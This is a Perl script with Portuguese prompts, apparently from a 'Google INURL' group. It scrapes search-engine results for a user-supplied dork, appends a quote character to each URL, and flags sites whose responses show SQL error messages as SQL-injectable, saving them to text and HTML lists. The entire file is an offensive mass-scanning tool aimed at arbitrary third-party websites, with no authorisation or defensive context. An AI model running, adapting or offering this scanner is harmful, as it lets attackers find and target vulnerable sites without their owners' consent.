#!/usr/bin/perl

use LWP::UserAgent;
use HTTP::Request;
use Term::ANSIColor;
use URI::Escape;
my $ua = LWP::UserAgent->new();
$ua->timeout(7);

system "clear";
print color("yellow"), q{

Editado Grupo Google INURL - Brasil pesquisa avançada.
Email:Google@inurl.com.br
Blog: blog.inurl.com.br
   
                                                                                                    
},color("reset");



open(clear,'>search-dump.txt.clear'); #deleting previous cleaned search results
close(clear);
open(dork,">search-dump.txt"); #deleting previous search results
close(dork);

print color("red"),"Tipo de dork",color("reset")," ex:(news.php?id=), ex:(site:br noticias.php?id=)\n Mais exemplos: \n http://blog.inurl.com.br/search/label/dorks\n http://blog.inurl.com.br/search/label/string\n";
print color("red"),"Dork de pesquisa: \n",color("reset");
   $dork = <STDIN>;
    $dork  = uri_escape($dork);
     chomp($dork);
     
print color("green"),"Arquivo para guardar sites De vulneráveis:",color("reset")," ex:(sitesbr.txt)\n";
print color("red"),"Nome do arquivo: \n",color("reset");
   $file = <STDIN>;
     chomp($file);
     
open(clear,">$file"); #deleting vul result file if the input is the same one
close(clear);
open(clear,">$file.html"); #deleting vul HTML result file if the input is the same one
close(clear);


print color("green"),"Pesquisar inicializado...",color("reset"),"\n";

for ($i = 0; $i < 10000; $i += 10) {
     $useragent = LWP::UserAgent->new(agent => 'Mozilla/4.8 [en] (Windows NT 6.0; U)');
     $useragent->timeout(10);
     $useragent->env_proxy;
  
     $curl = $useragent->get("http://busca.uol.com.br/web/?q=".$dork."&start=".$i)->content;
     $check = index($curl, 'link');

while (1) {
	$n = index($curl, '<a href="');
  
if ($n == -1) {
last;
}

$curl = substr($curl, $n + 9);
  $s = substr($curl, 0, index($curl, '"'));
  
print color("green"), "[+] ",color("reset"),"$s\n";
open(dork,">>search-dump.txt");
print dork $s, "\n";
close(dork);
}

if ($check == -1) {
last;
}
} 
   print "\n";
   print color("Red"),"[INFO] ",color("reset"),"Pesquisa Feita\n";
   print "\n";
   print color("Red"),"[INFO] ",color("reset"),"Removendo linhas duplicadas de sua busca.\n";
   sleep 2;

my $cleanrthefile = 'search-dump.txt';
my %seen = ();
{
   local @ARGV = ($cleanrthefile);
   local $^I = '.clear';
   while(<>){
      $seen{$_}++;
      next if $seen{$_} > 1;
      print;
   }
}
print color("Red"),"[INFO] ",color("reset"), "ficheiro de processamento concluído.\n";
sleep 2;
print "\n";

print color("Red"),"[INFO] ",color("reset"), "Opening search dump to search for",color("red")," vul's\n",color("reset");
print "\n";

open FILE, "<", "search-dump.txt" or die $!;
  my @amount1 = <FILE>;
  my $amount1 = @amount1;
  my $infomsg = "$amount1 uris to test";
   print color("red"), "[INFO]" ,color("reset")," $infomsg uris to test\n";
   print "\n";

$LOGFILE = "search-dump.txt";
open(LOGFILE) or die("Não foi possível abrir arquivo de log.");
foreach $line (<LOGFILE>) {
    chomp($line);              
    my $url = $line."'";
        
    my 	$request = HTTP::Request->new( GET => $url );
	my 	$response = $ua->request( $request );
	
	
			if ( $response->content =~ /SQL/  || $response->content =~ /\/var\/www\// ) {
       open(vul,">>$file");
    print vul $url, "\n";
    open HTML, ">>", "$file.html" or die $!;
    close(vul);
		print color("bold red"), "[+] ",color("reset"), "$url",color("bold red"),"      Vulnerável ",color("reset");
		print HTML "<a href=\"$url\">$url</a>\n";
		
	}
	
	
			elsif( $response->content =~ m/80040e14/i ) {
        open(vul,">>$file");
    print vul $url, "\n";
    open HTML, ">>", "$file.html" or die $!;
    close(vul);
        print color("bold yellow"), "[+] ",color("reset"), "$url",color("bold yellow")," MS DB error detected",color("bold red"), " SQLI possible",color("reset");
		print HTML "<a href=\"$url\">$url</a>\n";
		}	
		
		
			elsif( $response->content =~ m/SELECT (.*) FROM (.*) WHERE/i ) {
        open(vul,">>$file");
    print vul $url, "\n";
    open HTML, ">>", "$file.html" or die $!;
    close(vul);
     	print color("bold red"), "[+] ",color("reset"), "$url",color("bold red")," SELECT FROM WHERE detected",color("reset");
		print HTML "<a href=\"$url\">$url</a>\n";
		}	
		
		
		elsif( $response->content =~ m/SELECT (.*) FROM (.*)/i ) {
        open(vul,">>$file");
    print vul $url, "\n";
    open HTML, ">>", "$file.html" or die $!;
    close(vul);
     	print color("bold red"), "[+] ",color("reset"), "$url",color("bold red")," SELECT FROM WHERE detected",color("reset");
		print HTML "<a href=\"$url\">$url</a>\n";
		}	
		
		
		elsif( $response->content =~ m/(.*) Invalid argument supplied (.*)/i ) {
        open(vul,">>$file");
    print vul $url, "\n";
    open HTML, ">>", "$file.html" or die $!;
    close(vul);
     	print color("bold red "), "[+] ",color("reset"), "$url",color("bold red")," Invalid argument supplied Detected",color("reset");
		print HTML "<a href=\"$url\">$url</a>\n";
		}	
		
				
else {
	print color("green"), "[-] ",color("reset"),"$url",color("green"),"~",color("reset");
	
	}
	close vul;
	close HTML;
	print "\n";
}

print color("green"),"Pesquisa Vulnerabilidade feita\n",color("reset");
print color("red"),"No arquivo criado sera disponibilizado site com possíveis vulnerabilidade.\n",color("reset");
print "\n";
sleep 2;


open FILE, "<", "$file" or die $!;
my @amount = <FILE>;
my $amount = @amount;

open (CHECKBOOK, "$file");

while ($record = <CHECKBOOK>) {
   print color("red"), "[+] ",color("reset"),"[Vull]",color("red"),"--> ERRO ENCONTRADO! ",color("reset"),"$record",color("reset");
   
}

	
close(CHECKBOOK);
close(FILE);
   print "\n";
   print color("red"), "[+] $amount URLS ",color("reset")," parecem ser vulnerável. \n";
   print color("red"), "[+] ",color("reset"),"Sites vulneráveis ​​armazenados na",color ("red")," $file.html \n",color("reset");